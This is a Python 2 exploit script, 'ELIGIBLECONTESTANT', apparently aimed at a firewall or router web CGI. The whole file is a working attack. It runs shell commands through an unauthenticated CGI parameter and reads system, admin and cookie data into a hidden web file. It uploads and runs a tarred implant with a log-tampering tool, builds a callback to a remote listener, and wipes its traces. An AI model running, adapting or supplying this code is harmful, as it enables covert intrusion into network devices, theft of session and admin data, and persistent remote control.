#!/usr/bin/env python2.7

import tarfile
from StringIO import StringIO
from time import sleep,ctime
from fosho import *

class ELCOExploit(HTTPSExploit):
    name = "ELIGIBLECONTESTANT"
    version = "v1.1.0.1"
    desc="A packet drops in a router. Does anyone hear it?"
    modes = ["nopen"]
    target_url= "/site/image/white.gif"
    exploit_url = "/cgi/maincgi.cgi"
    stagerfn = "stage/stager.sh"
    tinyexec = "stage/tiny-exec"
    setlog   = "stage/setlog"
    cfg = "ELCO.cfg"

    def touch(self,resp=None):
        out = []
        if not resp:
            resp = self.head(self.target_url)
        if 'etag' in resp.headers:
            etag,date = self._parse_etag(resp.headers['etag'])
            ##

            out.append("Etag - %s; Last modified - %s" % (etag,date))
        self.timeout = None
        return out

    def probe(self):
        temp = randstr(7)
        ##

        self.log.info("Scheduling cleanup in 60 seconds...")
        self._run_cmd("( sleep 60 && rm -f /www/htdocs/site/pages/.%s )" % temp)

        self.log.info("Probing system and retrieving target info...")
        ##

        self._run_cmd("( cat /e*/is* && uname -a && /t*/b*/cfgt* system admininfo showonline && cat /*/*coo*/* )>/www/htdocs/site/pages/.%s"% temp)
        res = self.get("/site/pages/.%s" % temp)
        self.log.info("System information retrieved:\n"+res.content)

        self.log.info("Forcing removal of temp file from target now...")
        self._run_cmd("killall sleep && rm -f /www/htdocs/site/pages/.%s" % temp)
        if res.content.find("i686") == -1:
            return "System does not appear to be x86. Probably not exploitable."
        if res.content.find("tospass") != -1 or res.content.find("superman") != -1:
            self.log.warning("User may be logged in. PLEASE REVIEW SYSTEM INFO")

    def exploit(self):
        self.log.info("Uploading and running payload...")
        ##

        ##

        self._run_cmd("rm -f /tmp/ht*;tar xzvf `ls -c /tmp/cgi*|head -n 1` -C /tmp/ && chmod +x /tmp/ht*;/tmp/htpd",self.payload)
        
    def clean(self):
        self.log.info("Cleaning up...")
        self._run_cmd("cd /tmp;rm -f cgi* htpd httpd htttpd /www/htdocs/site/pages/.*")

    def _run_cmd(self,cmd,content=None,**kwargs):
        params = {
                    "Url":"Command",
                    "Action":"sh",
                    "Para":"sh -c "+cmd.replace(" ","\t")
        }
        if content:
            c = StringIO(content)
            kwargs['data'],kwargs['files'] = params,{randstr(5):c}
            return self.post(self.exploit_url,**kwargs)
        else:
            kwargs['params'] = params
            return self.get(self.exploit_url,**kwargs)


    def build_nopen_exploit_payload(self):
        cmd = "/tmp/htttpd %s D=-c%s tos_configd &" % ("/tmp/httpd",self.ns.callback)
        self.build_exploit_payload(cmd)

    def build_exploit_payload(self,cmd="/tmp/httpd"):
        ##

        out = StringIO()
        tf = tarfile.open(mode="w:gz",fileobj=out)
        ##

        tf.dereference = True
        try:
            tf.add(self.tinyexec,arcname='htttpd')
            tf.add(self.binpath,arcname='httpd')
            tf.add(self.setlog,arcname='httppd')

            ##

            stager = ""
            for i,l in enumerate(open(self.stagerfn).readlines()):
                if i == 0 or not l.strip().startswith("#"):
                    stager+=l
            stager = stager.format(cmd=cmd)
            attr = tf.tarinfo()
            attr.__dict__.update(
                {'name':'htpd','uname':'nobody','gname':'nobody','size':len(stager)}
            )
            tf.addfile(attr,StringIO(stager))
        except IOError, e:
            self.log.error("Couldn't find file. Ensure paths are correct and you have run make.")
            raise e
        tf.close()
        out.seek(0)
        self.payload = out.read()
    def _parse_etag(self,etag):
        etag = etag.split("/")[-1].strip('"')
        date = ctime(int(etag.split("-")[-1],16))
        return etag,date

def main():
    run_exploit(ELCOExploit)

if __name__=="__main__":
    main()
